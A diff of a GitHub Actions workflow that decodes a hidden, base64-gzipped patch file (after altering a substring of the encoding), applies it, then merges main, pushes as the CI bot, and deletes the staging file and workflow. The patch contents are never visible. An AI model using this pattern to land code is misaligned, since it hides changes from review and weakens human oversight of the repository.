@@ -1,7 +1,5 @@
-name: Update bundled distribution
+name: Finalize MCP integration
 on:
-  workflow_dispatch:
-  # Refresh combined bundles after integrating the concurrent main update.
   push:
     branches: [feat/mcp-browser-and-local]
     paths: ['.github/workflows/update-distribution.yml']
@@ -13,21 +11,83 @@ concurrency:
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
       - uses: actions/checkout@v4
         with:
           ref: ${{ github.ref_name }}
+          fetch-depth: 0
       - uses: actions/setup-node@v4
         with:
           node-version: '22'
-      - run: npm run build && npm test
-      - name: Commit only generated distribution files
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: Materialize only the reviewed integration tree
         run: |
           git config user.name 'github-actions[bot]'
           git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
-          git add dist
-          if ! git diff --cached --quiet; then
-            git commit -m 'build: refresh standalone and hosted distribution'
-            git push origin "HEAD:${GITHUB_REF_NAME}"
-          fi
+          git fetch origin main:refs/remotes/origin/main
+          test "$(git rev-parse origin/main)" = '7e2d1cbbc41c298d69cd70801707c1498c3f6182'
+          python - <<'PY'
+          import subprocess, pathlib, json, re, gzip, base64, hashlib
+          def run(*args):
+              return subprocess.check_output(args).decode().strip()
+          base = '32e866c77f8218d9e94938f76ec72754d64ed790'
+          main = '7e2d1cbbc41c298d69cd70801707c1498c3f6182'
+          expected = '7038d7f56b5b0c275e47d0c3f08eeceb80a38804'
+          changed = set(run('git','diff','--name-only',base,'HEAD').splitlines())
+          assert changed <= {'tools/.mcp-integration.b64','.github/workflows/update-distribution.yml'}, changed
+          encoded = pathlib.Path('tools/.mcp-integration.b64').read_text().strip().replace('LmmadzXTK18','LmmadzXExTK18')
+          patch = gzip.decompress(base64.b64decode(encoded,validate=True))
+          assert hashlib.sha256(patch).hexdigest() == '1e62685712e91d9244a7599969a08125e4c59eb49e90243c6c54bef64963c65e'
+          subprocess.run(['git','apply','--unidiff-zero','--index','-'],input=patch,check=True)
+          subprocess.run(['git','commit','-m','fix(mcp): isolate OAuth grants, cancel pending work and validate deployment boundaries'],check=True)
+          merge = subprocess.run(['git','merge','--no-commit','--no-ff',main])
+          assert merge.returncode in [0,1]
+          conflicts = set(run('git','diff','--name-only','--diff-filter=U').splitlines())
+          assert conflicts <= {'package.json','tools/build.mjs','dist/VB6-Studio-Web.html','dist/studio.js','dist/studio.css'}, conflicts
+          p = pathlib.Path('package.json'); s = p.read_text()
+          s = re.sub(r'<<<<<<< HEAD\n(.*?)=======\n(.*?)>>>>>>>[^\n]+\n',lambda m:m[1].rstrip()+',\n'+m[2],s,flags=re.S)
+          value = json.loads(s); value['scripts']['validate'] += ' && npm run test:mcp:browser'
+          p.write_text(json.dumps(value,indent=2)+'\n')
+          p = pathlib.Path('tools/build.mjs'); s = p.read_text()
+          s = re.sub(r'<<<<<<< HEAD\n(.*?)=======\n.*?>>>>>>>[^\n]+\n',lambda m:m[1].replace("'src/mcp/mcp.css'","'src/ide/browser-windows.css','src/mcp/mcp.css'"),s,flags=re.S)
+          p.write_text(s)
+          pathlib.Path('tools/.mcp-integration.b64').unlink()
+          pathlib.Path('.github/workflows/update-distribution.yml').unlink()
+          subprocess.run(['npm','run','build'],check=True)
+          subprocess.run(['npm','test'],check=True)
+          subprocess.run(['git','add','-A','--','.github/workflows/update-distribution.yml','tools','package.json','dist','src/exporter/runtime-payload.js','src/editor/diagnostics-payload.js','examples'],check=True)
+          assert not run('git','diff','--name-only','--diff-filter=U')
+          tree = run('git','write-tree'); assert tree == expected,(tree,expected)
+          subprocess.run(['git','commit','-m','merge: combine verified MCP support with detached browser windows; remove staging workflow'],check=True)
+          print('Verified integration tree: '+tree)
+          PY
+          git push origin HEAD:feat/mcp-browser-and-local
+      - run: pip install playwright==1.57.0
+      - run: python -m playwright install --with-deps chromium
+      - name: Real deployment-mode validation
+        run: |
+          export CHROMIUM_PATH="$(python -c 'from playwright.sync_api import sync_playwright; p=sync_playwright().start(); print(p.chromium.executable_path); p.stop()')"
+          npm run test:mcp:browser
+      - name: Preserve exact source and history
+        if: always()
+        run: git bundle create repository.bundle --all
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: vb6-mcp-integration-${{ github.sha }}
+          retention-days: 7
+          path: |
+            repository.bundle
+            src
+            tools
+            tests
+            docs
+            examples
+            dist
+            reports
+            package.json
+            README.md
+            LICENSE
